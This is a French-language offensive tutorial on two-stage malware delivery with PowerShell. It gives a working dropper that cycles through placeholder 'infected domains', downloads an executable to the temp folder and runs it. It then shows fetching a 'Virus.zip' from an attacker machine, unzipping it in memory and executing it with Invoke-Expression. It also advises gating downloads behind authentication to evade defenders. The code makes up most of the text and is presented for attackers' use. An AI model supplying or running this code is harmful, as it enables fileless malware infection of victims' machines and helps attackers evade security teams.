
La plupart des malwares ne sont pas distribué en un seul fichier et fonctionne en 2 étages :

# __Dropper___

Afin **télécharger** et d'**éxecuter** le malware **en mémoire**, on va faire éxecuter un **dropper** qui va faire appel à un domaine infecté pour télécharger notre payload.

Notez qu'il est conseillé de mettre une authentification web au téléchargement dans le but d'éviter une collecte par des blueTeamers qui aurai vu passer le flux sans avoir accès au code du dropper.

### Exemple

Avec powershell ce code ressemblerai à cela :

```powershell
$wvh = new-object net.webclient;
$nsh='http://<InfectedDomain1>/trkldl@http://<InfectedDomain2>/adCa0ad@http://<InfectedDomain3>/bl4bl4c4r'.split("@");
$onj = '453';
$dxo=$env:temp+'\'+$onj+'.exe';
foreach($wzi in $nsh){
	try{
		$wvh.downloadfile($wzi, $dxo);
		if((get-item $dxo).length -ge 80000){
			invoke-item $dxo;
			break;
		}	
	}catch{}
}
```

Pour résumer ce payload va :
- **Creer un objet pour telecharger**
- **Faire une liste des liens où trouver le malware**
- **Télécharger** puis **executer** le premier fichier qui aura une taille > 80000

## __Telechargement__

Windows 10 et + :

```powershell
Invoke-WebRequest -Uri 'http://<MACHINE_IP>:8000/Virus.zip' -outfile "virus.zip";
```

Windows 7 et - :

```powershell
# Creation d'un nouveau client web
$webClient = [System.Net.WebClient];

# Telechargement des donnes dans une variable
$zip = $webClient.DownloadData('http://<MachineIP>:8000/Virus.zip');
```


## __Extraction__

Une fois l'étape précédente effectué, le ZIP se trouve en mémoire dans la variable $zip. On doit donc les extraire en restant en mémoire.

```powershell
# Chargement de la bibliothèque System.IO.Compression
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null;

# Ouverture du fichier 'Virus.ps1' dans l'objet zip en mémoire
$entry = (New-Object System.IO.Compression.ZipArchive(New-Object System.IO.MemoryStream (, $zip))).GetEntry('Virus.ps1');

# Décompression du fichier
$b = [byte[]]::new($entry.Length);
$entry.Open().read($b, 0, $b.Length);

# Conversion en texte UTF8
$code = [System.Text.Encoding]::UTF8.GetString($b);
```


## __Execution__

Une fois le payload stocké en mémoire il ne reste plus qu'à l'éxécuter.

```powershell
$code | Invoke-Expression
```
